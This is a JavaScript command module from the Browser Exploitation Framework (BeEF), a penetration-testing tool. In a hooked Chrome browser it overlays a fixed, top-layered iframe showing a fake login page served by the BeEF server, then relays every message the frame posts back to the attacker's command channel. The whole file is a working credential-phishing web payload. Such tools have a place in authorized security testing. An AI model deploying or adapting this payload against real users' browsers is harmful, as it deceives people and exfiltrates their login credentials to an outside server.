//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	// Prepare the onmessage event handling
	var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
	var eventer = window[eventMethod];
	var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
	eventer(messageEvent,function(e) {
		if (e.data == "KILLFRAME") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Killing Frame');	
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'meta=KILLFRAME');	
			beef.dom.removeElement('EVIFRAME');
			return;
		} else {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=' + e.data);	
		}
	},false);	

	if (beef.browser.isC()) {
		beef.dom.createIframe('custom', {'src':beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/ev/login.html','id':'EVIFRAME'}, {'width':'317px','height':'336px','position':'fixed','right':'0px','top':'0px','z-index':beef.dom.getHighestZindex()+1,'border':'0px','overflow':'hidden'}); 
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Chrome IFrame Created .. awaiting messages');	
	} 


});
